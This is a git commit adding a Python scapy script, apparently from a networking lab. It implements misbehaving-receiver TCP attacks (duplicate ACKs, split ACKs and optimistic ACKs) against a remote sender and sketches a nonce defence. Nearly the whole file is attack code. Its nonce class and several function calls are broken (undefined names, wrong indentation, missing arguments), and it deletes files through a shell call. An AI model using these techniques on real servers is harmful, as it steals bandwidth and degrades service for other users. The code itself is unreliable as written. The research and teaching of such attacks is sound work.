701ab1cca9ce03b465e098f07947532d04946925
Jesse Yue <someonebob156@gmail.com>
2018-11-26 03:17:24 -0500

    opt fix basis

---
+++ transmit_fix.py
@@ -0,0 +1,220 @@
+#! /usr/bin/env python
+from scapy.all import *
+import random
+import sys
+import numpy as np
+import subprocess as sp
+import threading
+from threading import Thread, Event
+import random
+
+### Global variable definitions.
+#########################################
+IP_DST = sys.argv[2]
+DST_PORT =  int(sys.argv[3])
+
+SRC_PORT = random.randint(1024,65535)
+data = list()
+FileName = "npy/%s.npy" % sys.argv[1]
+
+## For Opt attack specifically.
+MTU = 1472 # Default for TCP
+WAIT_TIME = 0.05
+curr_ACK = 0  # For OPT
+curr_SEQ = 0  # For OPT
+count_SEQ = 0 # For DUP
+MAX_SIZE = 200000
+
+## Defined across all tranmission types.
+socket = conf.L2socket(iface="client-eth0")
+
+syn = IP(dst=IP_DST) / TCP(window=65535, sport=SRC_PORT, dport=DST_PORT, flags='S')
+IP_SRC = syn[IP].src
+SRC_PORT = syn[TCP].sport
+
+#### Sending SYN
+syn_ack = sr1(syn)
+initialTs = syn_ack.time
+initialSeq = syn_ack[TCP].seq
+count_SEQ = initialSeq
+
+### Sending response after SYN_ACK
+getStr = 'GET / HTTP/1.1\r\n\r\n'
+request = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
+                 seq=(syn_ack[TCP].ack), ack=(syn_ack[TCP].seq + 1), flags='FA') / getStr
+socket.send(Ether() / request)
+
+
+### Nonce for countering attacks
+nonce_pool = {}
+class Nonce(pkt):
+    name = "Nonce"
+    fields_desc = [IntField("nonce", self.getNonce()), IntField("reply", 0)]
+
+    def getNonce():
+    nonce = random.getrandbits(32)
+    # add nonce to the pool, increment count if already exists at key
+    self.nonce_pool[nonce] = self.nonce_pool.get(nonce, 0) + 1 
+    return nonce
+
+bind_layers(TCP, Nonce, sport=SRC_PORT)
+bind_layers(TCP, Nonce, dport=DST_PORT)
+
+def checkNonce(pkt):
+    if not pkt.haslayer(Nonce):
+        return
+    else:
+        # check if nonce reply matches
+        nonce_reply = pkt[Nonce].reply
+        nonce_count = nonce_pool.get(nonce_reply, 0)
+        if nonce_count == 0:
+            return
+        else:
+            if nonce_cnt == 1:
+                del nonce_pool[nonce_reply]
+            else:
+                nonce_pool[nonce_reply] = nonce_cnt - 1
+
+
+
+
+### Global method definitions.
+##########################################
+### Send ACK with sequence no seq and ack num ack.
+def send_ACK(seq, ack, nonce):
+  ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
+             seq=seq, ack=ack, flags='A') / Nonce(reply=nonce)
+  socket.send(Ether() / ack_pkt)
+
+### Send ACK with normal sequence progression.
+def send_ACK_in_seq(pkt):
+  send_ACK(pkt[TCP].ack, pkt[TCP].seq + data_len(pkt), pkt[Nonce].nonce)
+
+
+### Function to send ACK used in opt.
+def send_ACK_opt():
+  global curr_ACK
+  while (curr_ACK - initialSeq) < MAX_SIZE:
+    curr_ACK += MTU
+    send_ACK(curr_SEQ, curr_ACK)
+
+## Split ACK across several packets
+def get_split_acks(pkt):
+  tcp_seg_len = data_len(pkt)
+  ACK_delta = tcp_seg_len / 3 # use 3 for now
+  nextACK_num = pkt[TCP].seq + tcp_seg_len
+  ACK_nums = list()
+  if ACK_delta != 0:
+    ACK_nums = range(pkt[TCP].seq + ACK_delta, nextACK_num, ACK_delta)
+  if nextACK_num not in ACK_nums:
+    ACK_nums.append(nextACK_num);
+  return ACK_nums
+
+### Append new data point.
+def append(pkt):
+  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
+
+### Function to check the formatting of packet.
+def check_pkt(pkt):
+  return (IP not in pkt) or (TCP not in pkt) or (pkt[IP].src != IP_DST) or (pkt[TCP].sport != DST_PORT)
+
+### Calculate length of TCP data segment.
+def data_len(pkt):
+  ip_len = pkt.getlayer(IP).len
+  ip_head_len = pkt.getlayer(IP).ihl * 32 / 8
+  tcp_head_len = pkt.getlayer(TCP).dataofs * 32 / 8
+  return ip_len - ip_head_len - tcp_head_len
+
+
+
+
+### Proper handling for packet with normal transmission.
+#########################################################
+def normal(pkt):
+  if (check_pkt(pkt)):
+    return
+  append(pkt)
+  send_ACK_in_seq(pkt)
+  
+
+
+
+### Proper handling for packet with DUP attack.
+#########################################################
+def dup(pkt):
+  if (check_pkt(pkt)):
+    return
+  append(pkt)
+
+  for i in xrange(10):
+    send_ACK_in_seq(pkt)
+
+
+### Proper handling for packet with SPLIT attack.
+#########################################################
+def split(pkt) :
+  if (check_pkt(pkt)):
+    return
+  append(pkt)
+  
+  for ACK_num in get_split_acks(pkt):
+    send_ACK(pkt[TCP].ack, ACK_num)
+
+
+### Proper handling for OP attacks.
+#########################################################
+def op(pkt):
+  if (check_pkt(pkt)):
+    return
+  append(pkt)
+  # ACKs being send optimistically, not in response.
+
+## Sniffer runs in background constantly to check if packets have nonces
+class Sniffer(Thread):
+    def  __init__(self, interface="client-eth0"):
+        super().__init__()
+        self.interface = interface
+        self.stop_sniffer = Event()
+
+    def run(self):
+        # only sniff packets coming to the sender, ie acks
+        sniff(iface=self.interface, prn=checkNonce, filter="dst port {}".format(SRC_PORT), stop_filter=self.should_stop_sniffer)
+
+    def stop(self, timeout=None):
+        self.stop_sniffer.set()
+        super().stop(timeout)
+
+    def should_stop_sniffer(self, packet):
+        return self.stop_sniffer.isSet()
+
+sniffer = Sniffer()
+sniffer.start()
+
+## Special timing stuff for op attack.
+if sys.argv[1] == 'op':
+  curr_ACK = syn_ack[TCP].seq + 1
+  curr_SEQ = syn_ack[TCP].ack + len(getStr) + 1
+  t = threading.Timer(WAIT_TIME, send_ACK_opt)
+  t.start()
+
+
+
+
+### Choose proper ACK handling given attack type.
+#########################################################
+if sys.argv[1] == "normal" :
+    sniff(iface="client-eth0", prn=normal, filter="tcp and ip", timeout=4)
+if sys.argv[1] == "dup":
+    sniff(iface="client-eth0", prn=dup, filter="tcp and ip", timeout=4)
+if sys.argv[1] == "op" :
+    sniff(iface="client-eth0", prn=op, filter="tcp and ip", timeout=4)
+if sys.argv[1] == "split" :
+    sniff(iface="client-eth0", prn=split, filter="tcp and ip", timeout=4)
+
+sniffer.stop()
+
+### Write data out to proper file.
+#########################################################
+numbas = np.asarray(zip(*data))
+sp.call(["rm", "-f", FileName], shell=True)
+np.save(FileName, numbas)
